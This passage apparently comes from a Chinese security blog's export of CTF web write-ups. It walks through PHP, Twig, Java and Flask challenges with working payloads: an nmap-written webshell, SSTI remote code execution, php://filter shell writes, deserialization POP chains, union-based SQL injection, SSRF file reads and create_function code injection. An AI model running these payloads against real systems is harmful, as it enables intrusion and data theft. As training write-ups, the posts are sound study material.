escapeshellcmd()的作用就很简单了，在&amp;#;`|*?~&lt;&gt;^()[]{}$ \\x0A 和 \\xFF和没有配对的单引号前插入””例如：’123’&#39;‘ ls’ —&gt; ‘123’\\‘’ ls&#39; 因此我们按payload传入的话，语句变成： 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\\\&#x27;&#x27;\\&lt;\\?php @eval\\($_POST\\[&quot;mrl64&quot;\\]\\)\\;\\?\\&gt; -oG 1.php &#x27;&#x27; 如果最后的引号前没加空格的话，payload就会被转义成： 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\\\&#x27;&#x27;\\&lt;\\?php @eval\\($_POST\\[&quot;mrl64&quot;\\]\\)\\;\\?\\&gt; -oG 1.php&#x27;\\\\&#x27;&#x27;&#x27; 文件名会变成1.php\\\\ 如果引号没加的话，payload被转义成： 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\\\&#x27;&#x27;\\&lt;\\?php @eval\\($_POST\\[&quot;mrl64&quot;\\]\\)\\;\\?\\&gt; -oG 1.php\\&#x27; 文件名变成1.php&#39; [网鼎杯 2020 朱雀组]Nmap这题和上题原理是一模一样的，但是过滤了php，因此用短标签绕过标签php，用phtml绕过文件后缀名： 1&#x27;&lt;?= @eval($_POST[&quot;mrl64&quot;]);?&gt; -oG 1.phtml &#x27; 蚁剑连接即可。 [BJDCTF2020]Cookie is so stable根据提示，我们抓包观察cookie，发现最后页面会回显的内容与cookie中的user有关，进行测试确认是twig的ssti。 直接构建twig的rce相关payload： 1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat ../../../../flag&quot;)&#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"【ctfshow欢乐新春赛】write up","slug":"【ctfshow欢乐新春赛】write-up","date":"2022-02-22T12:53:29.000Z","updated":"2022-03-02T14:08:54.586Z","comments":true,"path":"2022/02/22/【ctfshow欢乐新春赛】write-up/","link":"","permalink":"http://example.com/2022/02/22/%E3%80%90ctfshow%E6%AC%A2%E4%B9%90%E6%96%B0%E6%98%A5%E8%B5%9B%E3%80%91write-up/","excerpt":"前言 过年的时候在打hgame，看了下这个新春赛的题目还是有一定难度的，这里补个票。","text":"前言 过年的时候在打hgame，看了下这个新春赛的题目还是有一定难度的，这里补个票。 热身查看源码： 1eval($_GET[&#x27;f&#x27;]); 相当简单粗暴，但是有一个疑点，没有highlight_file(__FILE__);代码但是却显示了代码，因此怀疑有包含，不过直接上phpinfo就能找到flag位置了： 12?f=phpinfo();?f=system(&#x27;tac /etc/ssh/secret/youneverknow/secret.php&#x27;); web1查看源码： 12345highlight_file(__FILE__);error_reporting(0);$content = $_GET[content];file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content); 很明显这里要绕过这个死亡exit()，这里要利用php://filter伪协议写入shell，payload如下： 1?content=php://filter/write=string.rot13|&lt;?cuc @riny($_cbfg[&quot;zey64&quot;]);?&gt;/resource=shell.php 然后蚁剑连接即可。 web2查看源码： 123456789101112highlight_file(__FILE__);session_start();error_reporting(0);include &quot;flag.php&quot;;if(count($_POST)===1)&#123; extract($_POST); if (call_user_func($$$$$$&#123;key($_POST)&#125;)===&quot;HappyNewYear&quot;)&#123; echo $flag; &#125;&#125; 首先函数开启session()，接着发现我们可以POST传入一个东西进去，并且我们传进去的东西会先执行extract()函数，最后判断call_user_func($$$$$$&#123;key($_POST)&#125;的值是否为HappyNewYear。 了解逻辑后，我们开始构建payload。首先我们POST传值： 1session_id=session_id 这样进行extract($_POST);时，我们会得到$session_id=session_id这个结果，而$&#123;key($_POST)&#125;表示的就是以我们POST的变量名做为新变量的变量名，这样套个娃就会发现if中的语句就变成了call_user_func($session_id)===&quot;HappyNewYear&quot;，因此我们更改PHPSESSID的值就可以了。 完整payload： 12POST:session_id=session_idcookie:PHPSESSID=HappyNewYear web3查看源码： 1234567891011highlight_file(__FILE__);error_reporting(0);include &quot;flag.php&quot;;$key= call_user_func(($_GET[1]));if($key==&quot;HappyNewYear&quot;)&#123; echo $flag;&#125;die(&quot;虎年大吉，新春快乐！&quot;); 这题刚开始看着懵懵的，但其实想清楚后就感觉不是很难。本质上这题考的就是一个弱类型比较，只要$key能够得到一个bool(true)就可以解决了，因此这题考的就是对函数的熟悉程度了。 找了几个payload，都可以解决这个问题： 123?1=session_start?1=json_last_error?1=error_reporting web4查看源码： 1234567highlight_file(__FILE__);error_reporting(0);$key= call_user_func(($_GET[1]));file_put_contents($key, &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);die(&quot;虎年大吉，新春快乐！&quot;); 这题看着就更麻了，看了wp才懂。这里要用到一个函数：spl_autoload_extensions()。 spl_autoload_extensions(file_extensions) — 注册并返回 spl_autoload 函数使用的默认文件扩展名file_extensions:当不使用任何参数调用此函数时，它返回当前的文件扩展名的列表，不同的扩展名用逗号分隔。要修改文件扩展名列表，用一个逗号分隔的新的扩展名列表字符串来调用本函数即可。默认的 spl_autoload 函数使用的扩展名是 “.inc,.php”。 因此我们GET传入这个函数，就会生成一个内容为一句马的，名字叫.inc,.php的shell文件，之后命令执行即可。payload： 123456第一步：?1=spl_autoload_extensions第二步：/.inc,.phpPOST：1=system(&#x27;ls ../../../&#x27;);1=system(&#x27;cat ../../../f1ag.txt&#x27;); web5查看源码： 12345678error_reporting(0);highlight_file(__FILE__);include &quot;🐯🐯.php&quot;;file_put_contents(&quot;🐯&quot;, $flag);$🐯 = str_replace(&quot;hu&quot;, &quot;🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯&quot;, $_POST[&#x27;🐯&#x27;]);file_put_contents(&quot;🐯&quot;, $🐯); 逻辑就是将flag写入文件🐯中，但是最后会把$🐯的内容写入，从而导致flag被覆盖。因此我们要利用str_replace()函数的特性，上传超长字符串导致溢出从而使得出现致命错误导致变量命名失败，这样就可以绕过最后的写入了。 根据计算，需要2097152个hu才能溢出，因此用python生成： 12345678hu = &#x27;hu&#x27;flag = &#x27;&#x27;file_handle=open(&#x27;1.txt&#x27;,mode=&#x27;w&#x27;)for i in range(0,2097152): flag += hufile_handle.write(flag)file_handle.close()print(&#x27;ok&#x27;) 用bp传值，然后下载文件即可获取flag。 web6查看源码： 123456789101112131415161718192021222324252627error_reporting(0);highlight_file(__FILE__);$function = $_GET[&#x27;POST&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;ctfshow&#x27;,&#x27;daniu&#x27;,&#x27;happyhuyear&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST[&#x27;GET&#x27;]);$_SESSION[&#x27;file&#x27;] = base64_encode(&quot;/root/flag&quot;);$serialize_info = filter(serialize($_SESSION));if($function == &#x27;GET&#x27;)&#123; $userinfo = unserialize($serialize_info); //出题人已经拿过flag，题目正常,也就是说... echo file_get_contents(base64_decode($userinfo[&#x27;file&#x27;]));&#125; 反序列化相关的题真的好难。审计源码首先我们需要$function=&#39;GET&#39;，接着要利用file_get_contents读取文件，看了wp后了解到应该要读取nginx日志/var/log/nginx/access.log。 这里应用到反序列化逃逸这个知识点，构建payload： 1GET[_SESSION][ctfshowdaniu]=s:1:&quot;;s:1:&quot;1&quot;;s:4:&quot;file&quot;;s:36:&quot;L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==&quot;;&#125; 这个payload我啃了好久才啃懂。 extract($_POST[&#39;GET&#39;]);，我们需要POST一个数组GET[_SESSION][ctfshowdaniu]，这样传进去就可以得到$_SESSION数组变量，ctfshowdaniu是数组变量中的一个键。 接着要进行字符串逃逸，因此我们要利用到filter函数。首先我们来看看SESSION一开始的序列化内容： 1a:2:&#123;s:12:&quot;ctfshowdaniu&quot;;s:70:&quot;s:1:&quot;;s:1:&quot;1&quot;;s:4:&quot;file&quot;;s:36:&quot;L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==&quot;;&#125;&quot;;s:4:&quot;file&quot;;s:16:&quot;L3Jvb3QvZmxhZw==&quot;;&#125; 而利用这个函数后吞掉了ctfshowdaniu，因此序列化内容变成了下面这个： 1a:2:&#123;s:12:&quot;&quot;;s:70:&quot;s:1:&quot;;s:1:&quot;1&quot;;s:4:&quot;file&quot;;s:36:&quot;L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==&quot;;&#125;&quot;;s:4:&quot;file&quot;;s:16:&quot;L3Jvb3QvZmxhZw==&quot;;&#125; 那么替换成空后，又需要12个字符，因此后面的12个字符&quot;;s:70:&quot;s:1:就被当做了字符串处理。而这个70被屏蔽后payload长度就没有限制了，因此后面&quot;;s:4:&quot;file&quot;;s:16:&quot;L3Jvb3QvZmxhZw==&quot;;&#125;的部分就不会有作用了。 最后查看日志得到信息，访问http://127.0.0.1/ctfshow得到flag。 web7查看源码： 12345678910111213141516171819&lt;?phpinclude(&quot;class.php&quot;);error_reporting(0);highlight_file(__FILE__);ini_set(&quot;session.serialize_handler&quot;, &quot;php&quot;);session_start();if (isset($_GET[&#x27;phpinfo&#x27;]))&#123; phpinfo();&#125;if (isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(&quot;class.php&quot;);&#125;$happy=new Happy();$happy();?&gt; class.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293$happy=new Happy();$happy();?&gt;&lt;?php class Happy &#123; public $happy; function __construct()&#123; $this-&gt;happy=&quot;Happy_New_Year!!!&quot;; &#125; function __destruct()&#123; $this-&gt;happy-&gt;happy; &#125; public function __call($funName, $arguments)&#123; die($this-&gt;happy-&gt;$funName); &#125; public function __set($key,$value) &#123; $this-&gt;happy-&gt;$key = $value; &#125; public function __invoke() &#123; echo $this-&gt;happy; &#125; &#125; class _New_&#123; public $daniu; public $robot; public $notrobot; private $_New_; function __construct()&#123; $this-&gt;daniu=&quot;I&#x27;m daniu.&quot;; $this-&gt;robot=&quot;I&#x27;m robot.&quot;; $this-&gt;notrobot=&quot;I&#x27;m not a robot.&quot;; &#125; public function __call($funName, $arguments)&#123; echo $this-&gt;daniu.$funName.&quot;not exists!!!&quot;; &#125; public function __invoke() &#123; echo $this-&gt;daniu; $this-&gt;daniu=$this-&gt;robot; echo $this-&gt;daniu; &#125; public function __toString() &#123; $robot=$this-&gt;robot; $this-&gt;daniu-&gt;$robot=$this-&gt;notrobot; return (string)$this-&gt;daniu; &#125; public function __get($key)&#123; echo $this-&gt;daniu.$key.&quot;not exists!!!&quot;; &#125; &#125; class Year&#123; public $zodiac; public function __invoke() &#123; echo &quot;happy &quot;.$this-&gt;zodiac.&quot; year!&quot;; &#125; function __construct()&#123; $this-&gt;zodiac=&quot;Hu&quot;; &#125; public function __toString() &#123; $this-&gt;show(); &#125; public function __set($key,$value)#3 &#123; $this-&gt;$key = $value; &#125; public function show()&#123; die(file_get_contents($this-&gt;zodiac)); &#125; public function __wakeup() &#123; $this-&gt;zodiac = &#x27;hu&#x27;; &#125; &#125;?&gt; 我现在修成归来，首先查看phpinfo： 完美符合Session反序列化的特征，接下来重点就是分析pop链了。审计代码，发现file_get_contents()函数存在于Year类的show()中，那么这里就是pop链的终点。为了达到这个终点，我们发现Year类的__toString()魔术方法中有调用，因此我们要让$zodiac的值为Year类的实例化对象。而为了到达这个魔术方法，我们要用到_New_类中的__toString()魔术方法，因为这个魔术方法中存在$this-&gt;daniu-&gt;$robot=$this-&gt;notrobot。因此我们要触发__get()魔术方法，其中的字符串拼接可以触发_NEW_类中的__toString()。而要触发__get()魔术方法需要访问一个不存在的变量，我们可以利用Happy类的__destruct()来进行触发。 因此pop链的逻辑如下： 1Happy:__destruct() -&gt; _NEW_:__get() -&gt; _NEW_:__toString() -&gt; Year:__toString() -&gt; Year:show 编写exp： 12345678910111213141516171819202122&lt;?php class Happy &#123; public $happy; &#125; class _New_&#123; public $daniu; public $robot; public $notrobot; &#125; class Year&#123; public $zodiac; &#125;$a = new Happy();$a -&gt; happy = new _New_();$a -&gt; happy -&gt; daniu = new _NEW_();$a -&gt; happy -&gt; daniu -&gt; daniu = new Year();$a -&gt; happy -&gt; daniu -&gt; robot = &quot;zodiac&quot;;$a -&gt; happy -&gt; daniu -&gt; notrobot = &quot;/etc/passwd&quot;;var_dump(serialize($a));?&gt; payload: 1|O:5:\\&quot;Happy\\&quot;:1:&#123;s:5:\\&quot;happy\\&quot;;O:5:\\&quot;_New_\\&quot;:3:&#123;s:5:\\&quot;daniu\\&quot;;O:5:\\&quot;_New_\\&quot;:3:&#123;s:5:\\&quot;daniu\\&quot;;O:4:\\&quot;Year\\&quot;:1:&#123;s:6:\\&quot;zodiac\\&quot;;N;&#125;s:5:\\&quot;robot\\&quot;;s:6:\\&quot;zodiac\\&quot;;s:8:\\&quot;notrobot\\&quot;;s:11:\\&quot;/etc/passwd\\&quot;;&#125;s:5:\\&quot;robot\\&quot;;N;s:8:\\&quot;notrobot\\&quot;;N;&#125;&#125; 然后构造表单上传文件，更改filename为payload，得到任意文件读取： 12345&lt;form action=&quot;http://cd050ab5-a6ad-4f28-b9eb-195f497f0319.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 这一步是看wp学到的，这里要读取/proc目录，而/proc/{pid}/cmdline 是所有用户均可读的，可以编写脚本爆一下进程id的cmdline： 12345678910111213141516171819202122import requestsimport timedef get_file(filename): data=&quot;&quot;&quot;------WebKitFormBoundarytyYa582A3zCNLMeLContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;123------WebKitFormBoundarytyYa582A3zCNLMeLContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\\\\&quot;Happy\\\\&quot;:1:&#123;s:5:\\\\&quot;happy\\\\&quot;;O:5:\\\\&quot;_New_\\\\&quot;:3:&#123;s:5:\\\\&quot;daniu\\\\&quot;;O:5:\\\\&quot;_New_\\\\&quot;:3:&#123;s:5:\\\\&quot;daniu\\\\&quot;;O:4:\\\\&quot;Year\\\\&quot;:1:&#123;s:6:\\\\&quot;zodiac\\\\&quot;;N;&#125;s:5:\\\\&quot;robot\\\\&quot;;s:6:\\\\&quot;zodiac\\\\&quot;;s:8:\\\\&quot;notrobot\\\\&quot;;s:&quot;&quot;&quot;+str(len(filename))+&quot;&quot;&quot;:\\\\\\&quot;&quot;&quot;&quot;+filename+&quot;&quot;&quot;\\\\&quot;;&#125;s:5:\\\\&quot;robot\\\\&quot;;N;s:8:\\\\&quot;notrobot\\\\&quot;;N;&#125;&#125;\\&quot;Content-Type: text/plain------WebKitFormBoundarytyYa582A3zCNLMeL--&quot;&quot;&quot; r=requests.post(url=&#x27;http://cd050ab5-a6ad-4f28-b9eb-195f497f0319.challenge.ctf.show/&#x27;,data=data,headers=&#123;&#x27;Content-Type&#x27;:&#x27;multipart/form-data; boundary=----WebKitFormBoundarytyYa582A3zCNLMeL&#x27;,&#x27;Cookie&#x27;: &#x27;PHPSESSID=a0bb8d5e6a7b50170a0f96ef5ea7c2c1&#x27;&#125;) return(r.text.encode()[1990:])for i in range(999): print(i) print(get_file(&#x27;/proc/&#x27;+str(i)+&#x27;/cmdline&#x27;)) time.sleep(0.2) 发现114进程存在server.py，读取源码： 12345678910111213141516171819from flask import *import osapp = Flask(__name__)flag=open(&#x27;/flag&#x27;,&#x27;r&#x27;)#flag我删了os.remove(&#x27;/flag&#x27;)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): return &quot;flag我删了，你们别找了&quot;@app.route(&#x27;/download/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def download_file(): return send_file(request.args[&#x27;filename&#x27;])if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;127.0.0.1&#x27;, port=5000, debug=False) 虽然flag被删了，但是flask在5000端口有一个server，且有一个任意读取路径，因此读取： 1http://127.0.0.1:5000/download/?filename=/proc/self/fd/3 得到flag。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"buu练习2","slug":"buu练习2","date":"2022-02-21T12:23:38.000Z","updated":"2022-04-14T07:44:16.409Z","comments":true,"path":"2022/02/21/buu练习2/","link":"","permalink":"http://example.com/2022/02/21/buu%E7%BB%83%E4%B9%A02/","excerpt":"前言 刷题没啥好说的，因为懒就没截图了，尽量说的清楚些。","text":"前言 刷题没啥好说的，因为懒就没截图了，尽量说的清楚些。 [RoarCTF 2019]Easy Calc进网页是个计算器，但是看js发现calc.php，进入发现源码： 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 但是num参数只能传入数字，因此我们要绕过waf。方法就是在GET时问好后面加一个空格，这里用到了PHP的字符串解析特性。php解析时会把空白符删除，接着用chr()绕过其他waf内容就行了。 payload： 12? num=var_dump(scandir(chr(47))) //扫描根目录? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) //列出flag [网鼎杯 2018]Fakebook信息收集发现robots.txt泄露源码，审计源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 发现curl()，怀疑考察ssrf，寻找$url的注入点，登陆后发现view.php界面下存在注入点，进行测试，万能密码测试发现存在sql注入，报错注入查询数据： 123456789101112131415161718//查库?no=233/**/union/**/select/**/1,database(),3,4--+fakebook//查表?no=233/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()--+users//查列名?no=233/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_schema=&#x27;fakebook&#x27;/**/and/**/table_name=&#x27;users&#x27;--+no,username,passwd,data//查数据?no=233/**/union/**/select/**/1,group_concat(no,username,passwd,data),3,4/**/from/**/users--+1mrl64ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:3:&quot;age&quot;;i:233;s:4:&quot;blog&quot;;s:15:&quot;mrl64.ahaha.com&quot;;&#125; 发现data中序列化内容，利用源码中的反序列化进行注入： 1234567891011121314&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;$a = new UserInfo();echo serialize($a);//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125; payload: 1?no=233/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;hacker&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; [RoarCTF 2019]Easy Java因为缺乏对应的知识这题想了挺久的，也是看了wp才学到的。进入网页是一个登陆页面，下面有个help，点进help发现url存疑： 1http://c9fafc43-ee05-4188-981e-dff5ae10fed7.node4.buuoj.cn:81/Download?filename=help.docx 将GET传值改为POST后发现可以下载文件，但是flag不存在help.docx中，查询各种资料后发现这里要用到一个信息泄露： WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 因此我们POST值获取文件： 1filename=WEB-INF/web.xml 查看文件找到flag目录，直接下载后解码： 12http://c9fafc43-ee05-4188-981e-dff5ae10fed7.node4.buuoj.cn:81/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class//改为POST传值 [BJDCTF2020]EzPHP审查元素发现提示，base32解码结果为1nD3x.php，访问页面查看源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123; if ( preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]) ) die(&#x27;You seem to want to do something bad?&#x27;); &#125;if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123; if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; $file = $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value)) die(&#x27;fxck you! I hate English!&#x27;); &#125; &#125; if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123; die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#x27;&#x27;, $arg); &#125; ?&gt; 一步一步审计，第一步要绕过$_SERVER[&#39;QUERY_STRING&#39;]，这个函数不会进行urldecode，因此可以用url编码绕过。第二步要绕过preg_match(&#39;/^$/&#39;)，这里用换行符绕过。第三步$_REQUEST绕过，这里是根据POST优先级高于GET来绕过的。第四步file_get_contents，老朋友伪协议就完事了。第五步sha1()比较，数组就可以了。 因此构造payload： 12345?deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a&amp;sh%61na[]=1&amp;p%61sswd[]=2POST:file=1&amp;debu=1 最后是第六步，我们发现$code和$arg是可控的，这里可以使用create_function()来绕过。 create_function()范例： 1234567$mrl64 = create_function(&#x27;$a,$b&#x27;,&#x27;return $a + &amp;b&#x27;)等价于function mrl64($a,$b)&#123; return $a+$b;&#125; 利用这个函数，我们可以构建$code(&#39;&#39;,$arg)来进行绕过： 12345678payload:flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//等价于function a(&#x27;&#x27;,$arg)&#123; return &#125;var_dump(get_defined_vars());//&#125; 这样构建的思路就是闭合a函数，并且跟上执行代码，最后用注释符将后面的内容注释掉，payload： 1234567?deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a&amp;sh%61na[]=1&amp;p%61sswd[]=2&amp;fl%61g[c%6fde]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//debu=1&amp;file=1 读取到变量： 1[&quot;ffffffff11111114ggggg&quot;]=&gt; string(89) &quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot; &#125; 但是访问进去后我们发现没有给我们flag，因此猜测可能flag被过滤了，要在前一个网页中读取，payload： 1234567?deb%75=aq%75a_is_c%75te%0a&amp;file=data://text/plain,deb%75_deb%75_aq%75a&amp;sh%61na[]=1&amp;p%61sswd[]=2fl%61g[c%6fde]=create_function&amp;fl%61g[%61rg]=&#125;require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//debu=1&amp;file=1 还是个假flag，那就用伪协议读取，获取flag，用取反绕过过滤。 [NCTF2019]True XML cookbook这题按题目看是XXE，但是用xml配合伪协议读取源码没有发现什么有效内容，用源码中的账号密码也没有有用信息。思考XXE可以用来打内网，寻找存活主机，搜索/etc/hosts没有找到有效信息，看了wp知道了这里要读取/proc/net/arp文件，找到10.128.253.12。 直接访问会报错，尝试爆破c段，最后爆破出正确网段，获取flag。 [Zer0pts2020]Can you guess it?题目给了源码，直接审计： 12345678910111213141516171819202122&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;$secret = bin2hex(random_bytes(64)); //生成一个随机数if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if (hash_equals($secret, $guess)) &#123; //比较guess与secret $message = &#x27;Congratulations! The flag is: &#x27; . FLAG; &#125; else &#123; $message = &#x27;Wrong.&#x27;; &#125;&#125;?&gt; 我们是不可能猜出来这个随机数的，因此下半部分的代码基本没用，重要的部分在上面。 首先告诉我们flag在config.php中，接着发现highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));这串代码，其中$_SERVER[&#39;PHP_SELF&#39;])返回正在执行的脚本名，而basename()返回路径中的文件名部分，例如： 1basename(&quot;/path/home.php&quot;)--&gt;home.php 因此我们可以利用这个函数读取config.php文件，我们访问/index.php/config.php，这样我们访问的是index.php，但经过basename会返回config.php。但正则匹配了这个文件名,因此用不可打印字符绕过，构建payload读取flag： 1/index.php/config.php/%ff?souce [RCTF2015]EasySQL看到注册登录以及提示sql，很明显的二次注入。注册账号时username设置： 1&#x27;mrl64&quot;\\ 接着发现可以改密码，尝试改密发现报错: 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;\\&quot; and pwd=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;&#x27; at line 1 因此判断是双引号包裹，推测sql语句： 1select * from user where username=&quot;&#x27;mrl64&quot;\\&quot; and password=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; 因此利用这点在注册出的username进行注入，记得要绕过waf： 